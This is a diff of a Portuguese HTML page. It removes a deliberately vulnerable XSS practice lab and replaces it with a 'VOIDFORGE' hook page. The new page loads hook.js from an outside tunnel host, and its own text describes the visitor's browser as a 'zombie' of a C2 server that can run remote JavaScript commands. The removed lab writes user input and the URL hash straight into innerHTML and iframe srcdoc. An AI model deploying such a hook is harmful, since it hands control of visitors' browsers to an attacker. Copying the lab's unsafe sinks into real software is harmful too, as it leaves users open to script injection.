@@ -1,168 +1,137 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt">
 <head>
-    <meta charset="UTF-8">
-    <title>XSS Lab Completo</title>
-
-    <style>
-        body{
-            background:#111;
-            color:#0f0;
-            font-family:monospace;
-            padding:30px;
-        }
-
-        .box{
-            border:1px solid #0f0;
-            padding:20px;
-            margin-bottom:20px;
-        }
-
-        input, textarea{
-            width:100%;
-            background:#000;
-            color:#0f0;
-            border:1px solid #0f0;
-            padding:10px;
-            margin-top:10px;
-        }
-
-        button{
-            margin-top:10px;
-            padding:10px;
-            background:#0f0;
-            color:#000;
-            border:none;
-            cursor:pointer;
-        }
-
-        iframe{
-            width:100%;
-            height:200px;
-            background:white;
-            margin-top:10px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página de Exemplo • VOIDFORGE Hook</title>
+  <script src="https://tunnel.srmgestao.com.br/hook.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&amp;family=Inter:wght@400;500&amp;display=swap');
+    body {
+      margin: 0;
+      padding: 0;
+      background: #0a0c0a;
+      color: #10b981;
+      font-family: 'Inter', system_ui, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      position: relative;
+    }
+    .matrix-bg {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      z-index: -1; opacity: 0.06; pointer-events: none;
+    }
+    .container {
+      max-width: 620px;
+      text-align: center;
+      padding: 40px 30px;
+      background: #020a06;
+      border: 1px solid #052e16;
+      border-radius: 20px;
+    }
+    h1 {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 2.2rem;
+      margin: 0 0 8px;
+      letter-spacing: -1px;
+    }
+    .subtitle {
+      color: #166534;
+      font-size: 0.95rem;
+      margin-bottom: 28px;
+    }
+    .status {
+      background: #052e16;
+      border: 1px solid #14532d;
+      padding: 16px 20px;
+      border-radius: 14px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      margin: 20px 0;
+      line-height: 1.5;
+    }
+    .info {
+      font-size: 0.85rem;
+      color: #4b5563;
+      line-height: 1.6;
+    }
+    a {
+      color: #10b981;
+      text-decoration: none;
+    }
+    a:hover { text-decoration: underline; }
+    .badge {
+      display: inline-block;
+      background: #052e16;
+      color: #10b981;
+      font-size: 10px;
+      padding: 2px 8px;
+      border-radius: 999px;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+  </style>
 </head>
 <body>
+  <canvas id="matrix" class="matrix-bg"></canvas>
+  
+  <div class="container">
+    <h1>VOIDFORGE</h1>
+    <div class="subtitle">PÁGINA DE EXEMPLO DO HOOK <span class="badge">v3</span></div>
+    
+    <div class="status" id="status">
+      🟢 Hook injetado.<br>
+      Conectando ao C2 em tempo real...
+    </div>
+    
+    <div class="info">
+      Esta página carrega automaticamente <code>&lt;script src="/hook.js"&gt;&lt;/script&gt;</code> (funciona via cloudflared tunnel).<br>
+      O navegador agora é um <strong>zombie</strong> no servidor C2.<br>
+      <strong>Para hook definitivo:</strong> mantenha esta aba aberta (ou use bookmarklet do painel). Fechar desconecta após timeout.<br><br>
+      Abra o painel C2 na URL do tunnel para controlar.
+    </div>
+  </div>
 
-<h1>XSS Vulnerable Lab</h1>
+  <script>
+    // Matrix effect (minimal)
+    (function() {
+      const canvas = document.getElementById('matrix');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      const chars = '01アイウエオ';
+      const fontSize = 11;
+      const columns = Math.floor(canvas.width / fontSize);
+      const drops = Array(columns).fill(1);
+      setInterval(() => {
+        ctx.fillStyle = 'rgba(10,12,10,0.08)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#10b981';
+        ctx.font = fontSize + 'px JetBrains Mono';
+        for (let i = 0; i < drops.length; i++) {
+          const text = chars[Math.floor(Math.random() * chars.length)];
+          ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+          if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+          drops[i]++;
+        }
+      }, 140);
+    })();
 
-<!-- REFLECTED XSS -->
-<div class="box">
-    <h2>1. Reflected XSS</h2>
+    // Update status when hook likely connected
+    setTimeout(() => {
+      const s = document.getElementById('status');
+      if (s && window.VF_HOOK) {
+        s.innerHTML = '✅ Conectado como zombie!<br>Verifique o painel C2. Comandos JS podem ser executados remotamente.';
+        s.style.borderColor = '#10b981';
+      }
+    }, 2800);
 
-    <input type="text" id="reflectedInput" placeholder="Digite payload XSS">
-
-    <button onclick="reflectedXSS()">
-        Executar
-    </button>
-
-    <div id="reflectedOutput"></div>
-</div>
-
-<!-- STORED XSS -->
-<div class="box">
-    <h2>2. Stored XSS</h2>
-
-    <textarea id="storedInput" placeholder="Digite payload persistente"></textarea>
-
-    <button onclick="storedXSS()">
-        Salvar Payload
-    </button>
-
-    <div id="storedOutput"></div>
-</div>
-
-<!-- DOM XSS -->
-<div class="box">
-    <h2>3. DOM XSS</h2>
-
-    <p>
-        Adicione na URL:
-    </p>
-
-    <pre>
-#&lt;script&gt;alert('DOM XSS')&lt;/script&gt;
-    </pre>
-
-    <div id="domOutput"></div>
-</div>
-
-<!-- IFRAME XSS -->
-<div class="box">
-    <h2>4. iframe Injection</h2>
-
-    <textarea id="frameInput" placeholder="HTML para iframe"></textarea>
-
-    <button onclick="iframeXSS()">
-        Carregar iframe
-    </button>
-
-    <iframe id="frame"></iframe>
-</div>
-
-<script>
-
-/* =========================
-   REFLECTED XSS
-========================= */
-
-function reflectedXSS(){
-
-    let payload =
-        document.getElementById("reflectedInput").value;
-
-    document.getElementById("reflectedOutput").innerHTML =
-        payload;
-}
-
-/* =========================
-   STORED XSS
-========================= */
-
-function storedXSS(){
-
-    let payload =
-        document.getElementById("storedInput").value;
-
-    localStorage.setItem(
-        "stored_payload",
-        payload
-    );
-
-    loadStored();
-}
-
-function loadStored(){
-
-    document.getElementById("storedOutput").innerHTML =
-        localStorage.getItem("stored_payload") || "";
-}
-
-loadStored();
-
-/* =========================
-   DOM XSS
-========================= */
-
-document.getElementById("domOutput").innerHTML =
-    decodeURIComponent(location.hash.substring(1));
-
-/* =========================
-   IFRAME XSS
-========================= */
-
-function iframeXSS(){
-
-    let payload =
-        document.getElementById("frameInput").value;
-
-    document.getElementById("frame").srcdoc =
-        payload;
-}
-
-</script>
-
+    // Hint in console
+    console.log('%c[VOIDFORGE] Exemplo de página carregada. Hook ativo.', 'color:#10b981');
+  </script>
 </body>
 </html>
